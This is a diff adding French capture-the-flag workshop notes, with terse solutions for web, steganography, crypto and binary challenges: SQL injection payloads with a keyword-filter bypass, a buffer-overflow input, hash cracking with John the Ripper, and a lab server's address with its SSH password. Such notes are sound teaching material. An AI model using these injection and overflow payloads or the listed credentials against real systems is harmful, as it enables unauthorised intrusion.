@@ -1,0 +1,43 @@
+#[Challenges]
+   #[Web]
+       #[User-Agent]
+           On spoof l'user agent.
+           curl --user-agent "Commodore 64" http://51.77.109.158/challenges/web_1 |grep Flag
+       #[Easy SQLI]
+           On veut transformer:
+               SELECT * FROM foods WHERE id=X
+           Dans l'URL: id=1 OR 1=1
+       #[SQLI]
+           On veux obtenir:
+               SELECT * FROM foods2 WHERE password='X' OR 1=1
+           On peux jouer avec l'input, on a l'erreur SQLI quand on met une quote (')
+           pass' OR 1=1 <- Il faut encore enlever la ' à la fin
+           pass' OR 1=1 # <- Le OR a été remplacé.. pourquoi ?
+           pass' OORR 1=1 # <- WORKING
+       #[Taper sur le backend]
+           On lit la requête (dans l'onglet network par exemple).
+           On lance une SQLI au serveur directement.
+       #[Proxy]
+           On intercepte la requête (Avec Burp ou directement le web browser)
+           On modifie le retour pour “PROXY”.
+   #[Stegano]
+       #[Metadata]
+           exiftool <binary>
+       #[Steghide]
+           steghide embed -cf imperial_march.wav -ef flag.txt
+       #[Malbolge]
+           Wikipedia: Malbolge, invented by Ben Olmstead in 1998, is an esoteric programming language
+           designed to be as difficult to program in as possible. And so it is :-)
+   #[Crypto]
+       #[Base 64]
+           echo ".." | base64 -d
+       #[Brute force]
+           # echo -n "Flag{panda}" | md5sum
+           https://github.com/magnumripper/JohnTheRipper/blob/bleeding-jumbo/doc/MASK
+           john hash.txt --format=raw-md5  '-mask=Flag{?w}' --wordlist=/usr/share/john/password.lst --fork=4
+   #[Binary]
+       #[Strings]
+           strings <binary>
+       #[Buffer Overflow]
+           ssh workshop@51.77.109.158 // password: workshop
+           printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde" | a.out
